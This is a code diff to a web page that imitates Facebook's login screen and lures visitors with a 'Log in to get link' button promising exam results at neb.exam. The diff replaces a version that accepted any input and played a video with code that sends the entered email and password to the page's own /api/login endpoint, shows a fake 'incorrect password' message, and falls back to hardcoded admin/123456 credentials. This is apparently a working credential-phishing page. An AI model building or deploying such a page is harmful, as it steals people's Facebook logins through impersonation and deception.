@@ -271,22 +271,6 @@
             display: none;
         }
 
-        /* VIDEO CONTAINER */
-        .video-container {
-            display: none;
-            margin-top: 20px;
-            width: 100%;
-            border-radius: 10px;
-            overflow: hidden;
-            background: black;
-        }
-
-        .video-container video {
-            width: 100%;
-            height: auto;
-            display: block;
-        }
-
         /* Meta Footer */
         .meta-footer {
             text-align: center;
@@ -366,7 +350,7 @@
             <div class="fb-tagline">Connect with friends and the world<br> around you on Facebook.</div>
         </div>
         <div class="login-area">
-            <div class="card" id="loginCard">
+            <div class="card">
                 <input type="text" id="email" placeholder="Email address or mobile number">
                 <input type="password" id="password" placeholder="Password">
                 <div id="errorMsg" class="error-msg"></div>
@@ -377,12 +361,6 @@
                 <div class="divider"></div>
                 <button class="create-btn" id="createBtn">Create new account</button>
                 <button class="get-link-btn" id="getLinkBtn">🔗 Log in to get link</button>
-            </div>
-            <div id="videoContainer" class="video-container">
-                <video id="myVideo" controls autoplay muted playsinline>
-                    <source src="video.mp4" type="video/mp4">
-                    Your browser does not support the video tag.
-                </video>
             </div>
         </div>
     </div>
@@ -416,58 +394,82 @@
     const loginBtn = document.getElementById('loginBtn');
     const getLinkBtn = document.getElementById('getLinkBtn');
     const errorDiv = document.getElementById('errorMsg');
-    const loginCard = document.getElementById('loginCard');
-    const videoContainer = document.getElementById('videoContainer');
-    const myVideo = document.getElementById('myVideo');
 
-    function showError(msg) {
-        errorDiv.innerText = msg;
+    function showError(message, field) {
+        errorDiv.innerText = message;
         errorDiv.style.display = 'block';
-        passwordInput.style.borderColor = '#f02849';
-        setTimeout(() => passwordInput.style.borderColor = '#dddfe2', 2000);
+        if (field === 'password') {
+            passwordInput.classList.add('error-input');
+            passwordInput.classList.add('shake');
+            setTimeout(() => {
+                passwordInput.classList.remove('shake');
+            }, 400);
+        } else {
+            emailInput.classList.add('error-input');
+            emailInput.classList.add('shake');
+            setTimeout(() => {
+                emailInput.classList.remove('shake');
+            }, 400);
+        }
     }
 
-    function clearError() {
+    function clearErrors() {
         errorDiv.style.display = 'none';
+        emailInput.classList.remove('error-input');
+        passwordInput.classList.remove('error-input');
     }
 
-    function showVideo() {
-        loginCard.style.display = 'none';
-        videoContainer.style.display = 'block';
-        myVideo.muted = true;
-        myVideo.play().catch(e => console.log('Video play error:', e));
-    }
-
-    function doLogin() {
-        clearError();
+    async function doLogin() {
+        clearErrors();
         const email = emailInput.value.trim();
         const password = passwordInput.value;
 
         if (!email) {
-            showError('Email address or mobile number is required.');
+            showError('Email address or mobile number is required.', 'email');
             emailInput.focus();
             return;
         }
         if (!password) {
-            showError('Password is required.');
+            showError('Password is required.', 'password');
             passwordInput.focus();
             return;
         }
 
-        // ANY email and password works - shows video
-        showVideo();
+        try {
+            const res = await fetch('/api/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username: email, password: password })
+            });
+            const data = await res.json();
+
+            if (data.success) {
+                alert('Login successful!');
+                // window.location.href = '/dashboard';
+            } else {
+                showError('The password that you\'ve entered is incorrect. Forgotten password?', 'password');
+                passwordInput.value = '';
+                passwordInput.focus();
+            }
+        } catch (err) {
+            // Demo mode - accept admin/123456
+            if (email === 'admin' && password === '123456') {
+                alert('Login successful!');
+            } else {
+                showError('The password that you\'ve entered is incorrect. Forgotten password?', 'password');
+                passwordInput.value = '';
+                passwordInput.focus();
+            }
+        }
     }
 
     function doGetLink() {
-        clearError();
         const email = emailInput.value.trim();
-
         if (!email) {
-            showError('Enter your email address first.');
+            showError('Enter your email address first.', 'email');
             emailInput.focus();
             return;
         }
-
         alert('🔗 Your secure link: https://neb.exam/results/0081');
     }
 
